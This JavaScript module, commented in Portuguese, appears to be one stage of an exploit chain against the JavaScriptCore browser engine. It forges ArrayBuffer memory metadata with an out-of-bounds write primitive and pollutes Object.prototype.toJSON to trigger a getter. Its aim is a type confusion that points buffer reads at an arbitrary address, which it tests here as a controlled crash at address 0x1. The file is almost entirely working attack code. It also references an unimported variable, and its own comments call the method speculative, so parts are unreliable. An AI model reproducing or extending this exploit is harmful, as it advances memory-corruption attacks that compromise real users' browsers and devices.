// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // A variável global que referencia o ArrayBuffer principal
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let retype_getter_called_flag = false;
let retype_leak_attempt_results = {};

// Endereço baixo e inválido para o teste de crash controlado.
// Usar 0x0 pode às vezes ser mapeado (página nula), 0x1 é geralmente uma boa aposta para causar um page fault.
const ENDERECO_INVALIDO_PARA_LEITURA_TESTE = new AdvancedInt64(0x1, 0x0);


class CheckpointObjectForRetype {
    constructor(id) {
        this.id = `RetypeCheckpoint-${id}`;
        this.marker = 0xD0D0D0D0; // Marcador interno para identificação
        // Adicionando a propriedade que terá o getter diretamente na instância para simplificar
        // ou manter no protótipo como estava, dependendo da preferência de poluição.
        // Para este teste, vamos definir o getter no protótipo mais tarde.
    }
}

export function toJSON_TriggerRetypeCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";
    // logS3(`toJSON_TriggerRetypeCheckpointGetter chamado em: ${this?.id || 'N/A'}`, "info", FNAME_toJSON);
    let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };
    try {
        // A iteração sobre as propriedades é o que deve acionar o getter
        for (const prop in this) {
            // Acessar a propriedade explicitamente pode ser necessário se o 'in' não for suficiente.
            // No entanto, o 'in' geralmente invoca [[GetOwnProperty]] que pode levar ao getter.
            // Para garantir, podemos tentar acessar:
            if (prop === GETTER_CHECKPOINT_PROPERTY_NAME) {
                 logS3(`Propriedade getter "${prop}" encontrada durante 'for...in' em toJSON.`, "info", FNAME_toJSON);
                 // Acessar a propriedade para garantir que o getter seja chamado.
                 // O resultado do getter não é usado aqui, apenas o efeito colateral de chamá-lo.
                 // eslint-disable-next-line no-unused-vars
                 const _ = this[prop];
            }
        }
    } catch (e) {
        logS3(`Erro dentro do toJSON_TriggerRetypeCheckpointGetter durante o loop de propriedades: ${e.message}`, "error", FNAME_toJSON);
        returned_payload.error_in_loop = e.message;
    }
    return returned_payload;
}


export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeRetypeOOB_AB_Test";
    logS3(`--- Iniciando Teste de "Re-Tipagem" do oob_array_buffer_real via ShadowCraft ---`, "test", FNAME_TEST);

    retype_getter_called_flag = false;
    retype_leak_attempt_results = { success: false, message: "Não inicializado", error: null };

    // Validações de configuração (essenciais)
    if (!JSC_OFFSETS.ArrayBufferContents ||
        JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START === undefined ||
        JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START === undefined ||
        JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET === undefined || // Usado para StructureID
        JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID === undefined) {
        logS3("Offsets críticos para ArrayBufferContents ou StructureID não estão definidos em config.mjs. Abortando teste.", "critical", FNAME_TEST);
        return;
    }
    const arrayBufferStructureID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
    if (arrayBufferStructureID !== 2 && arrayBufferStructureID !== 0x2) { // Verificação adicional
         logS3(`AVISO: ArrayBuffer_STRUCTURE_ID (${arrayBufferStructureID}) não é o valor comum (2). Verifique config.mjs.`, "warn", FNAME_TEST);
    }


    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON'; // Chave para poluir em Object.prototype

    try {
        await triggerOOB_primitive(); // Configura oob_array_buffer_real e oob_dataview_real
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB. Abortando.", "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Escrever "Metadados Sombra" no início do CONTEÚDO de oob_array_buffer_real
        // Estes metadados simulam a estrutura JSArrayBufferContents e JSCell para um ArrayBuffer.
        // O offset 0 aqui é relativo ao início do *buffer de dados* do oob_array_buffer_real.
        const shadow_metadata_offset_in_oob_data = 0x0; // Onde os metadados sombra são escritos

        // Estrutura JSCell simulada (apenas StructureID por enquanto)
        // O ID da estrutura de um ArrayBuffer é geralmente pequeno (ex: 2).
        // Assumindo que o StructureID está nos primeiros 4 bytes (formato comum para StructureID inline)
        // ou que estamos corrompendo um ponteiro para Structure (mais complexo para este passo).
        // Para simplificar, vamos assumir que queremos que a StructureID seja lida como parte dos dados.
        // O JSArrayBuffer em si (o objeto JS) tem o ponteiro para Structure.
        // Seu JSArrayBufferContents (m_impl) tem o dataPointer e sizeInBytes.
        // O objetivo aqui é fazer oob_array_buffer_real ser tratado como se tivesse este m_impl forjado.

        const shadow_structure_id_for_ab = new AdvancedInt64(arrayBufferStructureID, 0x0); // ID 2 para ArrayBuffer
        const arbitrary_read_size = new AdvancedInt64(0x1000, 0x0); // Tamanho para a leitura arbitrária

        logS3(`Escrevendo metadados sombra no offset de dados ${toHex(shadow_metadata_offset_in_oob_data)} do oob_array_buffer_real...`, "info", FNAME_TEST);

        // Escrevendo Structure ID (0x2) - Assumindo que o motor pode confundir e ler isto como Structure*
        // Nota: Esta parte é altamente especulativa e depende de como a confusão de tipo ocorre.
        // Se a confusão fizesse o motor tratar o *início dos dados* do oob_array_buffer_real como um JSCell,
        // então oob_write_absolute(shadow_metadata_offset_in_oob_data + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, shadow_structure_id_for_ab, 4)
        // faria mais sentido, mas aqui estamos escrevendo os *conteúdos* que queremos que sejam o novo m_impl.

        // Escrevendo m_sizeInBytes para o ArrayBufferContents "sombra"
        oob_write_absolute(
            shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START,
            arbitrary_read_size,
            8 // sizeInBytes é geralmente size_t (64-bit em sistemas 64-bit)
        );

        // Escrevendo m_dataPointer para o ArrayBufferContents "sombra" (APONTANDO PARA O ENDEREÇO INVÁLIDO)
        oob_write_absolute(
            shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START,
            ENDERECO_INVALIDO_PARA_LEITURA_TESTE,
            8 // dataPointer é um ponteiro (64-bit)
        );
        logS3(`Metadados sombra configurados para apontar para: ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} com tamanho ${arbitrary_read_size.toString(true)}`, "info", FNAME_TEST);


        // 2. Realizar a Escrita OOB "Gatilho"
        // Offset 0x70 na DataView é (OOB_CONFIG.BASE_OFFSET_IN_DV + 0x70) no ArrayBuffer.
        // Ou, mais genericamente, (OOB_CONFIG.BASE_OFFSET_IN_DV - 16) no ArrayBuffer se 0x70 é referente ao início da DV.
        // Vamos usar o offset validado: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16
        // Este offset é relativo ao início do oob_array_buffer_real.
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Valor agressivo
        logS3(`Realizando escrita OOB gatilho em offset absoluto ${toHex(corruption_trigger_offset_abs)} com valor ${corruption_value.toString(true)}`, "info", FNAME_TEST);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);


        // 3. Configurar o Getter e Poluir Object.prototype.toJSON
        const checkpoint_obj = new CheckpointObjectForRetype(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                retype_getter_called_flag = true;
                const FNAME_GETTER = "RetypeGetter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" foi CHAMADO em this.id = ${this?.id || 'N/A'}!`, "vuln", FNAME_GETTER);

                try {
                    logS3("Dentro do getter: Tentando criar DataView sobre oob_array_buffer_real (esperançosamente re-tipado)...", "info", FNAME_GETTER);
                    // ESTE É O PONTO CRÍTICO:
                    // Se a re-tipagem ocorreu, oob_array_buffer_real pode agora ter seu m_impl (internals)
                    // apontando para os "metadados sombra" que escrevemos, incluindo o ENDERECO_INVALIDO_PARA_LEITURA_TESTE.
                    const retyped_dv = new DataView(oob_array_buffer_real);
                    logS3(`DataView (retyped_dv) criada. ByteLength: ${retyped_dv.byteLength}. Esperado: ${arbitrary_read_size.low()}`, "good", FNAME_GETTER);

                    logS3(`Tentando ler 4 bytes do endereço re-tipado (offset 0 da retyped_dv, que deve ser ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)})...`, "info", FNAME_GETTER);
                    const valorLido = retyped_dv.getUint32(0, true); // Tenta ler do offset 0 do endereço re-tipado

                    // Se chegarmos aqui sem erro, a leitura do endereço inválido NÃO causou um crash visível ao JS.
                    // Isso pode significar que o endereço era mapeado de alguma forma, ou o crash foi silencioso.
                    logS3(`LEITURA INESPERADA BEM-SUCEDIDA do endereço ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}! Valor lido: ${toHex(valorLido)}`, "error", FNAME_GETTER);
                    retype_leak_attempt_results.success = false; // Consideramos falha se não crashou como esperado
                    retype_leak_attempt_results.message = `Leitura de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} retornou ${toHex(valorLido)} em vez de causar um erro/crash explícito.`;

                } catch (e) {
                    // ESTE É O RESULTADO ESPERADO PARA O TESTE 1.A (CRASH CONTROLADO)
                    logS3(`SUCESSO ESPERADO (ERRO/CRASH): Erro ao tentar criar/usar DataView ou ler do endereço inválido ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}: ${e.message}`, "vuln", FNAME_GETTER);
                    retype_leak_attempt_results.success = true; // "Sucesso" no sentido de que a re-tipagem direcionou a leitura para o erro.
                    retype_leak_attempt_results.message = `A re-tipagem parece ter direcionado a leitura para ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}, causando erro: ${e.message}.`;
                    retype_leak_attempt_results.error = String(e);
                }
                return 0xBADF00D; // Valor de retorno do getter
            },
            configurable: true // Importante para poder restaurar depois
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerRetypeCheckpointGetter,
            writable: true,
            enumerable: false,
            configurable: true
        });
        toJSONPollutionApplied = true;
        logS3(`Poluição de Object.prototype.${ppKey_val} e getter em CheckpointObjectForRetype aplicadas.`, "info", FNAME_TEST);

        // 4. Acionar JSON.stringify no objeto de checkpoint
        logS3(`Chamando JSON.stringify no checkpoint_obj (id: ${checkpoint_obj.id})...`, "info", FNAME_TEST);
        try {
            const jsonResult = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify completado. Resultado: ${jsonResult}`, "info", FNAME_TEST);
        } catch (e) {
            logS3(`Erro durante JSON.stringify(checkpoint_obj): ${e.message}`, "error", FNAME_TEST);
            if (!retype_getter_called_flag) { // Se o getter não foi chamado E houve erro aqui
                 retype_leak_attempt_results.message = `Erro em JSON.stringify ANTES do getter ser chamado: ${e.message}`;
            }
        }

    } catch (mainError) {
        logS3(`Erro principal no teste executeRetypeOOB_AB_Test: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        retype_leak_attempt_results.success = false;
        retype_leak_attempt_results.message = "Erro crítico no fluxo principal do teste.";
        retype_leak_attempt_results.error = String(mainError);
    } finally {
        // Restauração da poluição
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
            // logS3(`Object.prototype.${ppKey_val} restaurado.`, "info", "Cleanup");
        }
        if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { // Verifica se a propriedade ainda existe
            // Para restaurar corretamente, precisamos do descritor original.
            // Se o original não existia, deletamos. Se existia, restauramos.
            if (originalGetterDesc) {
                Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
            } else {
                delete CheckpointObjectForRetype.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
            }
            // logS3(`Getter em CheckpointObjectForRetype restaurado.`, "info", "Cleanup");
        }
         logS3("Limpeza de poluição finalizada.", "info", "CleanupFinal");
    }

    // Log final dos resultados da tentativa de re-tipagem
    if (retype_getter_called_flag) {
        if (retype_leak_attempt_results.success) {
            // No Teste 1.A, "sucesso" significa que o erro esperado ao ler do endereço inválido ocorreu.
            logS3(`RESULTADO DO TESTE DE CRASH CONTROLADO: ${retype_leak_attempt_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO DO TESTE DE CRASH CONTROLADO: Getter foi chamado, mas o resultado não foi o erro esperado ao ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}. Detalhes: ${retype_leak_attempt_results.message}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO DO TESTE: Getter NÃO foi chamado. A tentativa de re-tipagem não pôde ser verificada.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes completos da tentativa: ${JSON.stringify(retype_leak_attempt_results)}`, "info", FNAME_TEST);


    clearOOBEnvironment();
    logS3(`--- Teste de "Re-Tipagem" (ShadowCraft) Concluído ---`, "test", FNAME_TEST);
}
